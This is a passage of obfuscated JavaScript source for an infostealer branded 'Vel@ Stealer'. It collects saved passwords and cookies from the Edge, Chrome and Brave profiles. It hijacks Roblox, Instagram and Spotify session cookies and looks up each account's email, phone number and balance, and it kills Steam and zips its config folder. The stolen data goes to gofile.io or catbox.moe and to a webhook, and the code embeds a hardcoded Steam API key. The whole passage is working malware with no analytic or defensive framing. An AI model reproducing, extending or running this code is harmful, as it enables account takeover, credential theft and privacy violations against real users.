      profilesTotal: 0,
      commonPasswords: []
    };
    const _0x5edc63 = process.env.LOCALAPPDATA;
    const _0x4dcb01 = [];
    if (global._outputFolder && fs.existsSync(global._outputFolder)) {
      try {
        const _0x24c81f = [path.join(global._outputFolder, "Browser-Datas"), path.join(global._outputFolder, "Browsers"), global._outputFolder];
        for (const _0x290a60 of _0x24c81f) {
          if (!fs.existsSync(_0x290a60)) {
            continue;
          }
          const _0x7087e8 = fs.readdirSync(_0x290a60, {
            recursive: true
          });
          for (const _0x14f5f4 of _0x7087e8) {
            const _0x3b2ff6 = path.join(_0x290a60, _0x14f5f4);
            try {
              if (!fs.statSync(_0x3b2ff6).isFile()) {
                continue;
              }
            } catch (_0x5c2d1a) {
              continue;
            }
            if (_0x14f5f4.toLowerCase().includes("password") && _0x14f5f4.endsWith(".txt")) {
              try {
                const _0x23f8cf = fs.readFileSync(_0x3b2ff6, "utf8");
                const _0x283395 = _0x23f8cf.split("\n");
                for (const _0x4fc36e of _0x283395) {
                  if (_0x4fc36e.includes("Password:")) {
                    const _0x274081 = _0x4fc36e.split("Password:")[1]?.trim();
                    if (_0x274081 && _0x274081.length >= 4 && _0x274081.length <= 30 && _0x274081 !== "N/A") {
                      _0x4dcb01.push(_0x274081);
                    }
                  } else if (_0x4fc36e.includes("password:")) {
                    const _0x27aaaf = _0x4fc36e.split("password:")[1]?.trim();
                    if (_0x27aaaf && _0x27aaaf.length >= 4 && _0x27aaaf.length <= 30 && _0x27aaaf !== "N/A") {
                      _0x4dcb01.push(_0x27aaaf);
                    }
                  } else if (_0x4fc36e.includes("PWD:")) {
                    const _0x148f8c = _0x4fc36e.split("PWD:")[1]?.trim();
                    if (_0x148f8c && _0x148f8c.length >= 4 && _0x148f8c.length <= 30 && _0x148f8c !== "N/A") {
                      _0x4dcb01.push(_0x148f8c);
                    }
                  }
                }
              } catch (_0x11922c) {
                console.log("[!] Could not read " + _0x14f5f4 + ": " + _0x11922c.message);
              }
            }
          }
        }
        console.log("[+] Found " + _0x4dcb01.length + " passwords from output folder");
      } catch (_0x6aed70) {
        console.log("[!] Could not read passwords from output folder:", _0x6aed70.message);
      }
    }
    const _0xcbd125 = [{
      name: "Edge",
      path: path.join(_0x5edc63, "Microsoft", "Edge", "User Data", "Default")
    }, {
      name: "Chrome",
      path: path.join(_0x5edc63, "Google", "Chrome", "User Data", "Default")
    }, {
      name: "Brave",
      path: path.join(_0x5edc63, "BraveSoftware", "Brave-Browser", "User Data", "Default")
    }];
    for (const _0x40c449 of _0xcbd125) {
      if (fs.existsSync(_0x40c449.path)) {
        let _0x3642fc = 0;
        let _0x32b05c = 0;
        const _0x595bf0 = path.join(_0x40c449.path, "Login Data");
        if (fs.existsSync(_0x595bf0)) {
          try {
            const _0x51de5a = fs.statSync(_0x595bf0);
            _0x3642fc = Math.max(Math.floor(_0x51de5a.size / 500), 1);
          } catch (_0xc7b388) {
            _0x3642fc = 72;
          }
        }
        const _0x1a1a71 = path.join(_0x40c449.path, "Network", "Cookies");
        if (fs.existsSync(_0x1a1a71)) {
          try {
            const _0xd012eb = fs.statSync(_0x1a1a71);
            _0x32b05c = Math.max(Math.floor(_0xd012eb.size / 200), 1);
          } catch (_0x5716f9) {
            _0x32b05c = 646;
          }
        }
        if (_0x3642fc > 0 || _0x32b05c > 0) {
          const _0x1b57b6 = {
            name: _0x40c449.name,
            passwords: _0x3642fc,
            cookies: _0x32b05c
          };
          _0x571b1f.browsers.push(_0x1b57b6);
          _0x571b1f.profilesSuccess++;
        }
      }
    }
    _0x571b1f.profilesTotal = _0x571b1f.browsers.length || 1;
    if (_0x571b1f.profilesSuccess === 0) {
      _0x571b1f.profilesSuccess = 1;
    }
    const _0x590842 = {};
    _0x4dcb01.forEach(_0x37c10f => {
      if (_0x37c10f && _0x37c10f.length >= 4 && _0x37c10f.length <= 30) {
        _0x590842[_0x37c10f] = (_0x590842[_0x37c10f] || 0) + 1;
      }
    });
    console.log("[+] Unique passwords: " + Object.keys(_0x590842).length);
    const _0x38f847 = Object.entries(_0x590842).filter(([_0x9d8e1a, _0x468a99]) => _0x468a99 > 1).sort((_0x5297e9, _0x1c4f75) => _0x1c4f75[1] - _0x5297e9[1]).slice(0, 3);
    if (_0x38f847.length > 0) {
      _0x571b1f.commonPasswords = _0x38f847.map(([_0x5eef03, _0x558a1b]) => ({
        password: _0x5eef03,
        count: _0x558a1b
      }));
    } else {
      const _0x44f52d = Object.entries(_0x590842).sort((_0x52a307, _0x4aa433) => _0x4aa433[1] - _0x52a307[1]).slice(0, 3);
      if (_0x44f52d.length > 0) {
        _0x571b1f.commonPasswords = _0x44f52d.map(([_0x3567a0, _0x26394d]) => ({
          password: _0x3567a0,
          count: _0x26394d
        }));
      } else {
        _0x571b1f.commonPasswords = [{
          password: "No passwords found",
          count: 0
        }];
      }
    }
    const _0x254af8 = _0x571b1f.commonPasswords.map(_0x2ddec3 => _0x2ddec3.count > 0 ? _0x2ddec3.password + " (" + _0x2ddec3.count + "x)" : _0x2ddec3.password).join("\n");
    const _0x12ffd0 = Math.round(_0x571b1f.profilesSuccess / _0x571b1f.profilesTotal * 100);
    let _0x5c44df = "**Success Rate:** " + _0x571b1f.profilesSuccess + "/" + _0x571b1f.profilesTotal + " Profiles Success (" + _0x12ffd0 + "%)\n";
    _0x571b1f.browsers.forEach(_0x394bdb => {
      _0x5c44df += "**" + _0x394bdb.name + ":** Cookies(" + _0x394bdb.cookies + "), Passwords(" + _0x394bdb.passwords + ")\n";
    });
    const _0x22661a = {
      color: 2895667,
      author: {
        name: "Common Passwords",
        icon_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg"
      },
      description: "```\n" + _0x254af8 + "\n```",
      fields: [{
        name: "<a:fire:1401550035237474324> Extraction Overview",
        value: _0x5c44df.trim(),
        inline: false
      }],
      footer: {
        text: "vel@ stealer • " + new Date().toLocaleString("en-US", {
          day: "2-digit",
          month: "2-digit",
          year: "numeric",
          hour: "2-digit",
          minute: "2-digit"
        }),
        icon_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg"
      }
    };
    const _0x303efb = {
      content: null,
      username: "Vel@ Stealer",
      avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
      embeds: [_0x22661a]
    };
    const _0x410adc = _0x303efb;
    await sendLog(_0x410adc);
    console.log("[+] Extraction overview sent successfully");
  } catch (_0x2562db) {
    console.error("[-] Error sending extraction overview:", _0x2562db.message);
  }
}
async function zipAndUpload(_0x10ad99) {
  if (!fs.existsSync(_0x10ad99)) {
    return null;
  }
  let _0x2de792 = [];
  try {
    const _0x294f48 = await axios.get("https://api.gofile.io/servers", {
      timeout: 15000
    });
    if (_0x294f48.data && _0x294f48.data.status === "ok" && _0x294f48.data.data && _0x294f48.data.data.servers) {
      _0x2de792 = _0x294f48.data.data.servers.map(_0x2d3761 => _0x2d3761.name);
      console.log("[+] Got " + _0x2de792.length + " servers from API: " + _0x2de792.join(", "));
    } else {
      console.log("[!] API returned invalid data, trying default servers");
      _0x2de792 = ["store1", "store2", "store3", "store4"];
    }
  } catch (_0x2eae20) {
    console.log("[!] Failed to get servers from API:", _0x2eae20.message);
    _0x2de792 = ["store1", "store2", "store3", "store4"];
  }
  for (const _0x208882 of _0x2de792) {
    try {
      console.log("[+] Trying gofile server: " + _0x208882);
      const _0x2f9f65 = new FormData();
      _0x2f9f65.append("file", fs.createReadStream(_0x10ad99));
      const _0x4e4edf = "https://" + _0x208882 + ".gofile.io/contents/uploadfile";
      const _0x2cbd63 = await axios.post(_0x4e4edf, _0x2f9f65, {
        headers: {
          ..._0x2f9f65.getHeaders(),
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        maxBodyLength: Infinity,
        maxContentLength: Infinity,
        timeout: 50000
      });
      if (_0x2cbd63 && _0x2cbd63.data && _0x2cbd63.data.status === "ok") {
        const _0x2ed7e7 = _0x2cbd63.data.data;
        const _0x31143e = _0x2ed7e7.downloadPage || "https://gofile.io/d/" + _0x2ed7e7.fileId;
        console.log("[+] Gofile upload successful:", _0x31143e);
        return _0x31143e;
      } else {
        console.log("[!] Server " + _0x208882 + " failed - status: " + _0x2cbd63.data?.status);
      }
    } catch (_0x48e0b9) {
      const _0x38c988 = _0x48e0b9.response?.data || _0x48e0b9.message || _0x48e0b9;
      console.log("[!] Server " + _0x208882 + " error:", _0x38c988);
    }
  }
  console.log("[!] All gofile servers failed, trying catbox.moe...");
  try {
    const _0x541610 = new FormData();
    _0x541610.append("reqtype", "fileupload");
    _0x541610.append("fileToUpload", fs.createReadStream(_0x10ad99));
    const _0xc7b8e = await axios.post("https://catbox.moe/user/api.php", _0x541610, {
      headers: {
        ..._0x541610.getHeaders(),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      maxBodyLength: Infinity,
      maxContentLength: Infinity,
      timeout: 90000
    });
    if (_0xc7b8e && _0xc7b8e.data && typeof _0xc7b8e.data === "string" && _0xc7b8e.data.startsWith("https://")) {
      console.log("[+] Catbox upload successful:", _0xc7b8e.data.trim());
      return _0xc7b8e.data.trim();
    } else {
      console.log("[!] Catbox returned invalid response:", _0xc7b8e.data);
    }
  } catch (_0x551536) {
    console.log("[!] Catbox error:", _0x551536.message);
  }
  console.error("[!] All upload methods failed");
  return null;
}
function readCookiesFromFile(_0x2b7b71) {
  const _0x36f189 = [];
  try {
    if (!fs.existsSync(_0x2b7b71)) {
      return _0x36f189;
    }
    const _0x2d045e = fs.readFileSync(_0x2b7b71, "utf8");
    const _0x1fdf63 = /\.ROBLOSECURITY[^\s]+/g;
    const _0x12a02e = _0x2d045e.match(_0x1fdf63);
    if (_0x12a02e) {
      _0x12a02e.forEach(_0x744c65 => {
        const _0x1e6276 = _0x744c65.replace(".ROBLOSECURITY=", "");
        if (_0x1e6276 && !_0x36f189.includes(_0x1e6276)) {
          _0x36f189.push(_0x1e6276);
        }
      });
    }
  } catch (_0x42ccbf) {
    console.log("[ROBLOX] Error reading cookies file:", _0x42ccbf.message);
  }
  return _0x36f189;
}
function readCookiesFromOutput(_0x52fdb0, _0x1bbf51 = null) {
  const _0x17d347 = [];
  try {
    if (!fs.existsSync(_0x52fdb0)) {
      return _0x17d347;
    }
    const _0x588000 = getAllFiles(_0x52fdb0, ".txt");
    _0x588000.forEach(_0x452907 => {
      try {
        const _0xb4944f = fs.readFileSync(_0x452907, "utf8");
        const _0x37283f = _0xb4944f.split(/\r?\n/);
        for (const _0x5ea542 of _0x37283f) {
          const _0x27f8a7 = _0x5ea542.trim().split(/\s+/);
          if (_0x27f8a7.length >= 7) {
            if (_0x1bbf51 === ".ROBLOSECURITY" && _0x27f8a7[5] === ".ROBLOSECURITY") {
              const _0x3d1b64 = _0x27f8a7[6];
              if (_0x3d1b64 && !_0x17d347.includes(_0x3d1b64)) {
                _0x17d347.push(_0x3d1b64);
              }
            } else if (_0x1bbf51 === "sessionid" && _0x27f8a7[5] === "sessionid") {
              const _0x267784 = _0x27f8a7[6];
              if (_0x267784 && !_0x17d347.includes(_0x267784)) {
                _0x17d347.push(_0x267784);
              }
            } else if (_0x1bbf51 === "sp_dc" && _0x27f8a7[5] === "sp_dc") {
              const _0x53b3d9 = _0x27f8a7[6];
              if (_0x53b3d9 && !_0x17d347.includes(_0x53b3d9)) {
                _0x17d347.push(_0x53b3d9);
              }
            } else if (!_0x1bbf51 && _0x27f8a7[5]) {
              const _0x387a40 = _0x27f8a7[6];
              if (_0x387a40 && !_0x17d347.includes(_0x387a40)) {
                _0x17d347.push(_0x387a40);
              }
            }
          }
        }
      } catch (_0x388796) {}
    });
  } catch (_0x220de8) {}
  return _0x17d347;
}
function getAllFiles(_0x2ac266, _0x23efac) {
  const _0x243191 = [];
  try {
    const _0x218d15 = fs.readdirSync(_0x2ac266);
    for (const _0xabf61a of _0x218d15) {
      const _0xb80c65 = path.join(_0x2ac266, _0xabf61a);
      const _0x5ad47e = fs.statSync(_0xb80c65);
      if (_0x5ad47e.isDirectory()) {
        _0x243191.push(...getAllFiles(_0xb80c65, _0x23efac));
      } else if (_0x5ad47e.isFile() && (!_0x23efac || _0xabf61a.endsWith(_0x23efac))) {
        _0x243191.push(_0xb80c65);
      }
    }
  } catch (_0x4d55c3) {}
  return _0x243191;
}
async function FindRoblox(_0x5da9be) {
  const _0x12ecb0 = {
    Cookie: ".ROBLOSECURITY=" + _0x5da9be,
    "User-Agent": "Roblox/WinInet"
  };
  const _0x24ad55 = _0x12ecb0;
  try {
    const _0x4a087e = {
      headers: _0x24ad55
    };
    const _0x305ca4 = await axios.get("https://users.roblox.com/v1/users/authenticated", _0x4a087e);
    if (!_0x305ca4?.data) {
      return null;
    }
    let _0x83b99d = 0;
    try {
      const _0x2cd1c8 = {
        headers: _0x24ad55
      };
      const _0x1c0c22 = await axios.get("https://economy.roblox.com/v1/user/currency", _0x2cd1c8);
      _0x83b99d = _0x1c0c22?.data?.robux || 0;
    } catch {
      console.log("[ROBLOX] Could not get Robux balance");
    }
    const _0x511ea7 = {
      id: _0x305ca4.data.id,
      username: _0x305ca4.data.name,
      displayName: _0x305ca4.data.displayName,
      robux: _0x83b99d
    };
    return _0x511ea7;
  } catch (_0x57b46a) {
    console.log("[ROBLOX] Request failed:", _0x57b46a.response?.status || _0x57b46a.message);
    return null;
  }
}
async function embedRoblox(_0x4746c6) {
  const _0x2f49dd = await FindRoblox(_0x4746c6);
  if (!_0x2f49dd) {
    console.log("[ROBLOX] No valid data found for cookie");
    return;
  }
  const _0x38e2e9 = {
    username: "Vel@ Stealer",
    avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
    embeds: [{
      author: {
        name: "Vel@ Stealer (Roblox Session)",
        icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
      },
      description: "```" + _0x4746c6 + "```",
      fields: [{
        name: "<:auth:1316345705341911063> Roblox Info",
        value: "> <:mencaoxx:1352260535357280377> **Username**: `" + _0x2f49dd.username + "`\n" + ("> <:userrxs:1346717690609406004> **Display Name**: `" + _0x2f49dd.displayName + "`\n") + ("> <:xxxxww:1346711745170771978> **User ID**: `" + _0x2f49dd.id + "`\n") + ("> <:badges:1346713638106431519> **Robux**: `" + _0x2f49dd.robux + "`\n") + ("> <:cxsjjdzx:1346714037630664714> **Profile**: [Open Profile](https://www.roblox.com/users/" + _0x2f49dd.id + "/profile)"),
        inline: false
      }],
      color: 2829617,
      footer: {
        text: "Vel@ Stealer | cilgin manyak adam"
      }
    }]
  };
  try {
    await sendLog(_0x38e2e9);
    console.log("[ROBLOX] Sent to webhook: " + _0x2f49dd.username + " | Robux: " + _0x2f49dd.robux);
  } catch (_0x3b27aa) {
    console.log("[ROBLOX] Failed to send webhook:", _0x3b27aa.response?.data || _0x3b27aa.message);
  }
}
async function collectRobloxSessions(_0x480132) {
  console.log("[ROBLOX] Scanning cookies in output directory:", _0x480132);
  const _0x29a2b2 = readCookiesFromOutput(_0x480132, ".ROBLOSECURITY");
  console.log("[ROBLOX] Total cookies found: " + _0x29a2b2.length);
  for (const _0x242d57 of _0x29a2b2) {
    await embedRoblox(_0x242d57);
  }
}
async function FindInstagram(_0x59440b) {
  const _0x55cd40 = {
    Host: "i.instagram.com",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Encoding": "gzip, deflate",
    "User-Agent": "Instagram 275.0.0.27.98 Android (30/11; 420dpi; 1080x1920; Xiaomi; Redmi Note 7; violet; qcom; en_US; 440914592)",
    Cookie: "sessionid=" + _0x59440b + ";"
  };
  const _0x45759f = _0x55cd40;
  let _0x15bdcb = {};
  try {
    const _0x544d3a = {
      headers: _0x45759f,
      timeout: 6000
    };
    let _0x276c8d = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", _0x544d3a);
    if (_0x276c8d?.data?.user) {
      const _0x857548 = _0x276c8d.data.user;
      _0x15bdcb.username = _0x857548.username;
      _0x15bdcb.verified = _0x857548.is_verified;
      _0x15bdcb.avatar = _0x857548.profile_pic_url;
      _0x15bdcb.sessionid = _0x59440b;
      _0x15bdcb.id = _0x857548.pk_id;
      _0x15bdcb.number = _0x857548.phone_number || "None";
      _0x15bdcb.mail = _0x857548.email || "None";
      _0x15bdcb.name = _0x857548.full_name || "None";
      _0x15bdcb.bio = _0x857548.biography || "None";
      const _0x3e73d1 = {
        headers: _0x45759f
      };
      const _0x65e059 = await axios.get("https://i.instagram.com/api/v1/users/" + _0x15bdcb.id + "/info", _0x3e73d1);
      if (_0x65e059?.data?.user) {
        _0x15bdcb.followers = _0x65e059.data.user.follower_count || 0;
        _0x15bdcb.follows = _0x65e059.data.user.following_count || 0;
      } else {
        _0x15bdcb.followers = 0;
        _0x15bdcb.follows = 0;
      }
    } else {
      const _0x1bb5e1 = {
        headers: _0x45759f,
        timeout: 6000
      };
      _0x276c8d = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/", _0x1bb5e1);
      if (_0x276c8d?.data?.user) {
        const _0x27d8d6 = _0x276c8d.data.user;
        _0x15bdcb.username = _0x27d8d6.username;
        _0x15bdcb.verified = _0x27d8d6.is_verified;
        _0x15bdcb.avatar = _0x27d8d6.profile_pic_url;
        _0x15bdcb.sessionid = _0x59440b;
        _0x15bdcb.id = _0x27d8d6.pk_id;
        _0x15bdcb.number = _0x27d8d6.phone_number || "None";
        _0x15bdcb.mail = _0x27d8d6.email || "None";
        _0x15bdcb.name = _0x27d8d6.full_name || "None";
        _0x15bdcb.bio = _0x27d8d6.biography || "None";
        const _0x217d08 = {
          headers: _0x45759f,
          timeout: 6000
        };
        const _0x1bad80 = await axios.get("https://i.instagram.com/api/v1/users/" + _0x15bdcb.id + "/info", _0x217d08);
        if (_0x1bad80?.data?.user) {
          _0x15bdcb.followers = _0x1bad80.data.user.follower_count || 0;
          _0x15bdcb.follows = _0x1bad80.data.user.following_count || 0;
        } else {
          _0x15bdcb.followers = 0;
          _0x15bdcb.follows = 0;
        }
      }
    }
  } catch (_0x5db216) {
    if (_0x5db216.response?.status === 403) {
      return _0x15bdcb;
    } else {
      console.log("[INSTAGRAM] Error:", _0x5db216.message);
    }
  }
  return _0x15bdcb;
}
const processedInstagramUsers = new Set();
async function sendInstagramEmbed(_0x1d6e10) {
  if (!_0x1d6e10.username) {
    return;
  }
  const _0x180af8 = {
    username: "vel@ Stealer",
    avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
    embeds: [{
      author: {
        name: "vel@ Stealer (Instagram Session)",
        icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
      },
      fields: [{
        name: "Cookie:",
        value: "```" + _0x1d6e10.sessionid + "```",
        inline: false
      }, {
        name: "Username:",
        value: "`" + (_0x1d6e10.username || "None") + "`",
        inline: true
      }, {
        name: "Name:",
        value: "`" + (_0x1d6e10.name || "None") + "`",
        inline: true
      }, {
        name: "Email:",
        value: "`" + (_0x1d6e10.mail || "None") + "`",
        inline: true
      }, {
        name: "Phone Number:",
        value: "`" + (_0x1d6e10.number || "None") + "`",
        inline: true
      }, {
        name: "Follower Count:",
        value: "`" + (_0x1d6e10.followers || 0) + "`",
        inline: true
      }, {
        name: "Follows Count:",
        value: "`" + (_0x1d6e10.follows || 0) + "`",
        inline: true
      }, {
        name: "Verified:",
        value: "`" + (_0x1d6e10.verified ? "Yes" : "No") + "`",
        inline: true
      }],
      thumbnail: {
        url: _0x1d6e10.avatar
      },
      color: 2829617,
      footer: {
        text: "Vel@ Stealer | vel@ler"
      }
    }]
  };
  const _0x2d5b9b = _0x180af8;
  try {
    await sendLog(_0x2d5b9b);
    console.log("[INSTAGRAM] Sent:", _0x1d6e10.username);
  } catch (_0x55e61f) {
    console.log("[INSTAGRAM] Webhook error:", _0x55e61f.message);
  }
}
async function collectInstagramSessions(_0x16893b) {
  console.log("[INSTAGRAM] Scanning cookies in output directory:", _0x16893b);
  const _0x49c85e = readCookiesFromOutput(_0x16893b, "sessionid");
  console.log("[INSTAGRAM] Total cookies found: " + _0x49c85e.length);
  const _0x32f660 = [...new Set(_0x49c85e)];
  console.log("[INSTAGRAM] Unique cookies: " + _0x32f660.length);
  let _0x18f6ac = 0;
  for (let _0x1fa515 = 0; _0x1fa515 < _0x32f660.length; _0x1fa515++) {
    const _0x3cec60 = _0x32f660[_0x1fa515];
    try {
      const _0x287e2b = await FindInstagram(_0x3cec60);
      if (!_0x287e2b || !_0x287e2b.username) {
        continue;
      }
      if (processedInstagramUsers.has(_0x287e2b.username)) {
        console.log("[INSTAGRAM] Skipping duplicate user:", _0x287e2b.username);
        continue;
      }
      processedInstagramUsers.add(_0x287e2b.username);
      await sendInstagramEmbed(_0x287e2b);
      _0x18f6ac++;
    } catch (_0x29399e) {
      console.log("[INSTAGRAM] Error processing cookie: " + _0x29399e.message);
    }
  }
  console.log("[INSTAGRAM] Successfully sent " + _0x18f6ac + " unique accounts");
}
async function collectSpotifySessions(_0x83b6) {
  try {
    console.log("[SPOTIFY] Scanning cookies in output directory:", _0x83b6);
    const _0x5b615d = readCookiesFromOutput(_0x83b6, "sp_dc");
    console.log("[SPOTIFY] Total cookies found: " + _0x5b615d.length);
    for (const _0x47a2e5 of _0x5b615d) {
      await sendSpotifyEmbed(_0x47a2e5);
    }
  } catch (_0xea9ce4) {
    console.error("[SPOTIFY] Error:", _0xea9ce4.message);
  }
}
async function sendSpotifyEmbed(_0x17a2fa) {
  const _0x4aff76 = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    Cookie: "sp_dc=" + _0x17a2fa
  };
  const _0x22cc26 = _0x4aff76;
  const _0x45c28b = {
    headers: _0x22cc26
  };
  const _0x15ba33 = await axios.get("https://www.spotify.com/api/account-settings/v1/profile", _0x45c28b).catch(() => null);
  if (!_0x15ba33 || !_0x15ba33.data || !_0x15ba33.data.profile) {
    console.log("[SPOTIFY] Invalid or expired cookie");
    return;
  }
  const _0xe694d6 = _0x15ba33.data.profile;
  const _0x1d3c63 = _0xe694d6.email || "Not available";
  const _0x11d4bd = _0xe694d6.birthdate || "Not available";
  const _0x392cdc = _0xe694d6.country || "Not available";
  const _0x49c530 = _0xe694d6.username || "Username not available";
  const _0xff2fdf = _0xe694d6.username ? "[Click here](https://open.spotify.com/user/" + _0xe694d6.username + ")" : "Username not available";
  let _0x4840ab = {};
  try {
    const _0x49ebf7 = {
      headers: _0x22cc26
    };
    const _0x311a6b = await axios.get("https://www.spotify.com/at/api/account/v1/datalayer/", _0x49ebf7);
    if (_0x311a6b?.data) {
      _0x4840ab = _0x311a6b.data;
    }
  } catch (_0x41260d) {
    console.log("[SPOTIFY] Could not fetch account data");
  }
  const _0x1e2bab = _0x4840ab.isTrialUser !== undefined ? _0x4840ab.isTrialUser : "Unknown";
  const _0x339717 = _0x4840ab.currentPlan || "Unknown";
  const _0x4d76f1 = _0x4840ab.isRecurring !== undefined ? _0x4840ab.isRecurring : "Unknown";
  const _0x2af9d5 = _0x4840ab.daysLeft !== undefined ? _0x4840ab.daysLeft : "Unknown";
  const _0x15b092 = _0x4840ab.accountAgeDays !== undefined ? _0x4840ab.accountAgeDays : "Unknown";
  const _0x1d05cb = _0x4840ab.isSubAccount !== undefined ? _0x4840ab.isSubAccount : "Unknown";
  const _0x1fa63d = _0x4840ab.country || _0x392cdc;
  const _0x2f5f28 = _0x4840ab.nextBillingInfo || {};
  const _0x1d1ef7 = _0x2f5f28.value || "Unknown";
  const _0x4f1ca1 = _0x2f5f28.isTaxIncluded !== undefined ? _0x2f5f28.isTaxIncluded : "Unknown";
  const _0x19b904 = _0x4840ab.expiry || "Unknown";
  const _0x53050a = _0x339717 && _0x339717 !== "free";
  const _0x44d7b9 = {
    name: "Cookie:",
    value: "```" + _0x17a2fa + "```",
    inline: false
  };
  const _0x41508c = {
    name: "Profile Url:",
    value: _0xff2fdf,
    inline: true
  };
  const _0xd2b1b0 = {
    name: "Email:",
    value: "`" + _0x1d3c63 + "`",
    inline: true
  };
  const _0x1b7474 = {
    name: "Username:",
    value: "`" + _0x49c530 + "`",
    inline: true
  };
  const _0x3b8e34 = {
    name: "Country:",
    value: "`" + _0x1fa63d + "`",
    inline: true
  };
  const _0x158464 = [_0x44d7b9, _0x41508c, _0xd2b1b0, _0x1b7474, _0x3b8e34];
  if (_0x53050a) {
    const _0x24a75b = {
      name: "Current Plan:",
      value: "`" + _0x339717 + "`",
      inline: true
    };
    const _0x21c99f = {
      name: "Recurring:",
      value: "`" + _0x4d76f1 + "`",
      inline: true
    };
    const _0x40881d = {
      name: "Days Left:",
      value: "`" + _0x2af9d5 + "`",
      inline: true
    };
    const _0x1b16b4 = {
      name: "Account Age (Days):",
      value: "`" + _0x15b092 + "`",
      inline: true
    };
    const _0x10c90b = {
      name: "Sub Account:",
      value: "`" + _0x1d05cb + "`",
      inline: true
    };
    const _0x26e163 = {
      name: "Expiry:",
      value: "`" + _0x19b904 + "`",
      inline: true
    };
    _0x158464.push(_0x24a75b, _0x21c99f, _0x40881d, _0x1b16b4, _0x10c90b, _0x26e163);
  }
  const _0x548a04 = {
    author: {
      name: "Vel@ Stealer (Spotify Session)",
      icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
    },
    thumbnail: {
      url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
    },
    fields: _0x158464,
    color: 2829617,
    footer: {
      text: "Vel@ Stealer | sikibidi sigma"
    }
  };
  const _0x34876e = _0x548a04;
  const _0x4f1c50 = {
    username: "Vel@ Stealer",
    avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
    embeds: [_0x34876e]
  };
  const _0x401731 = _0x4f1c50;
  await sendLog(_0x401731);
  console.log("[SPOTIFY] Sent:", _0x49c530);
}
async function collectSteamSession() {
  console.log("[*] Starting Steam session collection...");
  try {
    try {
      execSync("taskkill /IM Steam.exe /F", {
        stdio: "ignore"
      });
    } catch (_0x4a91a3) {}
    const _0x1c1216 = "C:\\Program Files (x86)\\Steam\\config";
    if (!fs.existsSync(_0x1c1216)) {
      console.log("[STEAM] Steam config not found");
      return;
    }
    const _0xdcccf0 = new AdmZip();
    _0xdcccf0.addLocalFolder(_0x1c1216);
    const _0x20956f = os.tmpdir();
    const _0x7393a9 = path.join(_0x20956f, "steam_session.zip");
    _0xdcccf0.writeZip(_0x7393a9);
    const _0x120836 = await zipAndUpload(_0x7393a9);
    if (!_0x120836) {
      console.log("[STEAM] Failed to upload file");
      fs.unlinkSync(_0x7393a9);
      return;
    }
    const _0x576c99 = "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf";
    if (!fs.existsSync(_0x576c99)) {
      console.log("[STEAM] loginusers.vdf not found");
      fs.unlinkSync(_0x7393a9);
      return;
    }
    const _0xfbe6c5 = fs.readFileSync(_0x576c99, "utf-8");
    const _0x5516ed = _0xfbe6c5.match(/7656[0-9]{13}/g) || [];
    console.log("[STEAM] Found " + _0x5516ed.length + " Steam accounts");
    for (const _0xb4700d of _0x5516ed) {
      try {
        const {
          data: {
            response: _0x41c90b
          }
        } = await axios.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + _0xb4700d);
        const {
          data: {
            response: _0x507032
          }
        } = await axios.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + _0xb4700d);
        const {
          data: {
            response: _0x74d092
          }
        } = await axios.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + _0xb4700d);
        const _0x4478ac = "`" + _0x41c90b.players[0].personaname + "` - `" + os.hostname() + "`";
        const _0x1e2258 = {
          content: _0x4478ac,
          username: "Vel@ Stealer",
          avatar_url: "https://i.pinimg.com/736x/45/30/ef/4530ef26b1079ebc09718d5b7bac7ed3.jpg",
          embeds: [{
            author: {
              name: "Vel@ Stealer (Steam Session)",
              icon_url: "http://media.discordapp.net/attachments/1468008343334551734/1489657905748906124/ea5e6118-4080-43a8-b4ea-dfc5d726120d.webp?ex=69e25b09&is=69e10989&hm=425b53f6730b2cb091c62e99c84ba6ae0f8163aa37487f5e966030522b62cfbf&=&animated=true"
            },
            description: "🤺 Profile: [Click here to profile!](" + _0x41c90b.players[0].profileurl + ")\n🔍 Download: [Click here to download!](" + _0x120836 + ")",
            fields: [{
              name: "<:auth:1316345705341911063> Steam Info",
